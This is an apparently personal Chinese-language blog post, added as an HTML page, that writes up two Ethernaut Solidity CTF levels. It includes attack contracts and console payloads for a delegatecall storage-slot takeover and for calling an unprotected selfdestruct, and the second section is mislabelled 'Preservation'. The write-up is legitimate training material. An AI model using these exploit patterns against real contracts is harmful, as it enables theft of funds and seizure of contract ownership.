@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"qst137.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="区块链学习之肆老想学币了，可是币太贵了； ethernaut - Preservationdescription 12345678910&#x2F;&#x2F; This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances">
+<meta property="og:type" content="article">
+<meta property="og:title" content="区块链学习之肆">
+<meta property="og:url" content="https://qst137.github.io/2024/09/15/2024-09-15-%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%82%86/index.html">
+<meta property="og:site_name" content="QST2&#39;s BLOG">
+<meta property="og:description" content="区块链学习之肆老想学币了，可是币太贵了； ethernaut - Preservationdescription 12345678910&#x2F;&#x2F; This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.imgur.com/trllu38.png">
+<meta property="og:image" content="https://i.imgur.com/yzoFDx4.png">
+<meta property="article:published_time" content="2024-09-14T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-09-14T20:10:24.888Z">
+<meta property="article:author" content="QST137">
+<meta property="article:tag" content="菜鸟">
+<meta property="article:tag" content="BlockChain">
+<meta property="article:tag" content="WriteUp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.imgur.com/trllu38.png">
+
+<link rel="canonical" href="https://qst137.github.io/2024/09/15/2024-09-15-%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%82%86/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>区块链学习之肆 | QST2's BLOG</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">QST2's BLOG</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Version: WwJ</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://qst137.github.io/2024/09/15/2024-09-15-%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%82%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="QST137">
+      <meta itemprop="description" content="苍山岁岁有人去，唯愿洱海生白波。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="QST2's BLOG">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          区块链学习之肆
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2024-09-15 00:00:00 / Modified: 04:10:24" itemprop="dateCreated datePublished" datetime="2024-09-15T00:00:00+08:00">2024-09-15</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/blockchain/" itemprop="url" rel="index"><span itemprop="name">blockchain</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="区块链学习之肆"><a href="#区块链学习之肆" class="headerlink" title="区块链学习之肆"></a>区块链学习之肆</h1><p>老想学币了，可是币太贵了；</p>
+<h2 id="ethernaut-Preservation"><a href="#ethernaut-Preservation" class="headerlink" title="ethernaut - Preservation"></a>ethernaut - Preservation</h2><p><strong>description</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.</span><br><span class="line"></span><br><span class="line">// The goal of this level is for you to claim ownership of the instance you are given.</span><br><span class="line"></span><br><span class="line">  // Things that might help</span><br><span class="line"></span><br><span class="line">// Look into Solidity&#x27;s documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope.</span><br><span class="line">// Understanding what it means for delegatecall to be context-preserving.</span><br><span class="line">// Understanding how storage variables are stored and accessed.</span><br><span class="line">// Understanding how casting works between different data types.</span><br></pre></td></tr></table></figure>
+
+<p><strong>source</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line">    // public library contracts</span><br><span class="line">    address public timeZone1Library;</span><br><span class="line">    address public timeZone2Library;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 storedTime;</span><br><span class="line">    // Sets the function signature for delegatecall</span><br><span class="line">    bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));</span><br><span class="line"></span><br><span class="line">    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) &#123;</span><br><span class="line">        timeZone1Library = _timeZone1LibraryAddress;</span><br><span class="line">        timeZone2Library = _timeZone2LibraryAddress;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // set the time for timezone 1</span><br><span class="line">    function setFirstTime(uint256 _timeStamp) public &#123;</span><br><span class="line">        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // set the time for timezone 2</span><br><span class="line">    function setSecondTime(uint256 _timeStamp) public &#123;</span><br><span class="line">        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Simple library contract to set the time</span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line">    // stores a timestamp</span><br><span class="line">    uint256 storedTime;</span><br><span class="line"></span><br><span class="line">    function setTime(uint256 _time) public &#123;</span><br><span class="line">        storedTime = _time;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>分析源码，<code>Preservation</code> 定义了两个成员合约，可以存储时间，然后定义两个函数，通过 <code>delegatecall()</code> 调用 <code>setTime()</code>；</p>
+<p><code>delegatecall()</code> 的特点在这，在执行目标函数的时候，并不改变执行的上下文，本意是提供调用库函数的功能，但自然也能修改原合约的成员变量；</p>
+<p>如何但污染库？其实这个合约函数本身写的是有问题的，<code>storedTime = _time;</code> 这个赋值操作在原文的上下文中并不能找到 <code>uint256 storedTime</code>，而是将在 <code>delegatecall()</code> 的上下文中与 <code>LibraryContract</code> 中 <code>uint256 storedTime</code> 对应的 <code>Storage</code> 槽的对应位置的存储赋为目标值；</p>
+<p><code>timeZone1Library </code> 的 <code>uint256 storedTime</code> 位于第 1 个槽（填满），对应 <code>Preservation</code> 的 <code>address public timeZone1Library</code> ;</p>
+<p>故而解题思路是，部署一个能修改 <code>owner</code> 的恶意合约，然后以上述原理将 <code>timeZone1Library</code> 用 <code>timeZone2Library.setTime()</code> 污染为恶意合约地址，再调用 <code>timeZone1Library.setTime()</code> 即可；</p>
+<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p><strong>attack contract</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract PreservationAttack&#123;</span><br><span class="line">    address public timeZone1Library;</span><br><span class="line">    address public timeZone2Library;</span><br><span class="line">    address public owner;</span><br><span class="line">    function setTime(uint256) public &#123;</span><br><span class="line">        owner = tx.origin;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到恶意合约 <code>0x72872ddD9571727C9F8Fe91Cb6023deFCCF8a423</code>；</p>
+<p><strong>payload</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// pollute timeZone1Library </span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">setSecondTime</span>(<span class="string">&#x27;0x72872ddD9571727C9F8Fe91Cb6023deFCCF8a423&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// delecatecall attack contract</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">setFirstTime</span>(<span class="string">&#x27;0x0&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>成功；</p>
+<h2 id="ethernaut-Preservation-1"><a href="#ethernaut-Preservation-1" class="headerlink" title="ethernaut - Preservation"></a>ethernaut - Preservation</h2><p><strong>description</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent 0.001 ether to obtain more tokens. They have since lost the contract address.</span><br><span class="line"></span><br><span class="line">// This level will be completed if you can recover (or remove) the 0.001 ether from the lost contract address.</span><br></pre></td></tr></table></figure>
+
+<p><strong>source</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Recovery &#123;</span><br><span class="line">    //generate tokens</span><br><span class="line">    function generateToken(string memory _name, uint256 _initialSupply) public &#123;</span><br><span class="line">        new SimpleToken(_name, msg.sender, _initialSupply);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line">    string public name;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    // constructor</span><br><span class="line">    constructor(string memory _name, address _creator, uint256 _initialSupply) &#123;</span><br><span class="line">        name = _name;</span><br><span class="line">        balances[_creator] = _initialSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // collect ether in return for tokens</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        balances[msg.sender] = msg.value * 10;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // allow transfers of tokens</span><br><span class="line">    function transfer(address _to, uint256 _amount) public &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= _amount);</span><br><span class="line">        balances[msg.sender] = balances[msg.sender] - _amount;</span><br><span class="line">        balances[_to] = _amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // clean up after ourselves</span><br><span class="line">    function destroy(address payable _to) public &#123;</span><br><span class="line">        selfdestruct(_to);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第一次 <code>generateToken()</code> 生成的 <code>SimpleToken</code> 合约地址丢失了，现在要想办法恢复向原 <code>SimpleToken</code> 发送的<code>0,001 Ether</code>；</p>
+<p>区块链上的动作都是透明的，故而用 <a target="_blank" rel="noopener" href="https://sepolia.etherscan.io/">Etherscan</a> 查询 <code>instance</code> 合约的交易记录：</p>
+<p><img src="https://i.imgur.com/trllu38.png"></p>
+<p>发现创建合约，点进去查看余额和目标 <code>SimpleToken</code> 的地址：</p>
+<p><img src="https://i.imgur.com/yzoFDx4.png"></p>
+<p>找到了丢失的合约地址，又因为合约具有 <code>destroy</code> 函数，调用即可；</p>
+<h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p><strong>attack contract</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract RecoveryAttack &#123;</span><br><span class="line">    event log(bool);</span><br><span class="line">    event log(string);</span><br><span class="line"></span><br><span class="line">    constructor(address _victim) &#123;</span><br><span class="line">        (bool is_success,) = _victim.call(abi.encodeWithSignature(&quot;destroy(address)&quot;, payable(tx.origin)));</span><br><span class="line">        emit log(is_success);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>exploit 最短的一集，重点还是；</p>
+<h2 id="庆祝生活回到正轨且正轨变宽"><a href="#庆祝生活回到正轨且正轨变宽" class="headerlink" title="庆祝生活回到正轨且正轨变宽"></a>庆祝生活回到正轨且正轨变宽</h2><p>想起来我删了很久的一条：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 那就让我们来比一比，看看谁活得更精彩。</span></span><br></pre></td></tr></table></figure>
+
+<p>输了我就躺下，不过好像一直在赢，多久会输呢，敢不敢输呢；</p>
+<p>没想过，我相信不是不敢想，而只是被蒙蔽住了，或者占用掉了。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E8%8F%9C%E9%B8%9F/" rel="tag"># 菜鸟</a>
+              <a href="/tags/BlockChain/" rel="tag"># BlockChain</a>
+              <a href="/tags/WriteUp/" rel="tag"># WriteUp</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/09/15/2024-09-15-%E4%B8%A4%E5%B9%B4%E4%B8%8A%E4%B8%8B/" rel="prev" title="两年上下">
+      <i class="fa fa-chevron-left"></i> 两年上下
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%82%86"><span class="nav-number">1.</span> <span class="nav-text">区块链学习之肆</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ethernaut-Preservation"><span class="nav-number">1.1.</span> <span class="nav-text">ethernaut - Preservation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E8%A7%A3"><span class="nav-number">1.1.1.</span> <span class="nav-text">题解</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ethernaut-Preservation-1"><span class="nav-number">1.2.</span> <span class="nav-text">ethernaut - Preservation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E8%A7%A3-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">题解</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BA%86%E7%A5%9D%E7%94%9F%E6%B4%BB%E5%9B%9E%E5%88%B0%E6%AD%A3%E8%BD%A8%E4%B8%94%E6%AD%A3%E8%BD%A8%E5%8F%98%E5%AE%BD"><span class="nav-number">1.3.</span> <span class="nav-text">庆祝生活回到正轨且正轨变宽</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">QST137</p>
+  <div class="site-description" itemprop="description">苍山岁岁有人去，唯愿洱海生白波。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Qst137" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Qst137" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:Q_ST@bupt.edu.cn" title="E-Mail → mailto:Q_ST@bupt.edu.cn" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">QST137</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
